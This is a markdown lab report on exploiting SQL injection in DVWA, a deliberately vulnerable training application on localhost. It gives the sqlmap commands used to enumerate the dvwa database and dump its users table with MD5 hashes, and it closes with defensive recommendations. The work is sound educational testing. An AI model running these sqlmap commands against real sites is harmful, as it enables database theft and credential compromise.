# 🔐 Vulnerability Report: SQL Injection via DVWA

## 🧠 Overview
This report outlines the discovery and exploitation of a **SQL Injection (SQLi)** vulnerability in the **Damn Vulnerable Web Application (DVWA)** using `sqlmap`. The objective was to simulate a real-world attack scenario to test the web application's resilience to injection flaws.

---

## 🎯 Target Application
- **Application**: DVWA (Damn Vulnerable Web Application)
- **URL**: `http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit`
- **Security Level**: Low
- **Environment**: DVWA on Docker/localhost
- **Vulnerable Parameter**: `id` (GET)

---

## 🛠 Tools Used
- **SQLmap**: Automated SQL Injection tool
- **Environment**: Windows 10, Docker Desktop
- **Browser**: Firefox/Chrome (for login & cookie extraction)
- **Session Authentication**: PHPSESSID cookie used in SQLmap

---

## 🧪 Methodology

### 1. Detecting SQL Injection
```bash
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=52mjgugebi15c212kkbtf7ecj4" --batch --dbs
```
> ✅ SQLmap confirmed SQL Injection vulnerability and listed available databases.

### 2. Listing Tables in Target Database
```bash
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=52mjgugebi15c212kkbtf7ecj4" --batch -D dvwa --tables
```

### 3. Retrieving Columns of `users` Table
```bash
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=52mjgugebi15c212kkbtf7ecj4" --batch -D dvwa -T users --columns
```

### 4. Dumping Table Data
```bash
python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="security=low; PHPSESSID=52mjgugebi15c212kkbtf7ecj4" --batch -D dvwa -T users --dump
```

---

## 🔍 Findings

### Database: `dvwa`
- Tables:
  - `users`
  - `guestbook`

### Table: `users`
| user_id | user    | avatar                      | password (MD5)                           | last_name | first_name | last_login          |
|---------|---------|-----------------------------|------------------------------------------|-----------|------------|---------------------|
| 1       | admin   | /hackable/users/admin.jpg   | 5f4dcc3b5aa765d61d8327deb882cf99 (pwd)   | admin     | admin      | 2025-05-26 14:55:20 |
| 2       | gordonb | /hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123)| Brown     | Gordon     | 2025-05-26 14:55:20 |
| ...     | ...     | ...                         | ...                                      | ...       | ...        | ...                 |

### Vulnerabilities Detected
- SQL Injection via GET parameter.
- Unhashed session IDs in cookies.
- Passwords stored as **MD5 hashes** (easily crackable).
- No input validation or sanitization.

---

## 🛡 Recommendations

1. **Input Validation**: Use parameterized queries (prepared statements).
2. **Stored Password Security**: Replace MD5 with bcrypt or Argon2.
3. **Web App Firewall**: Deploy WAF rules to detect SQLi patterns.
4. **Session Handling**: Use secure, random, and rotating session IDs.
5. **Security Headers**: Add CSP, X-Content-Type, and X-Frame headers.
6. **Use ORM Tools**: Such as SQLAlchemy or Django ORM to reduce injection risk.

---

## 📌 Conclusion
This simulated attack successfully demonstrates how vulnerable the application is to SQL injection. SQLmap was able to extract entire database schemas and user credentials. Strengthening backend query handling and enforcing input validation are critical next steps for defense.

---

*This report was generated as part of a security testing exercise for educational purposes.*
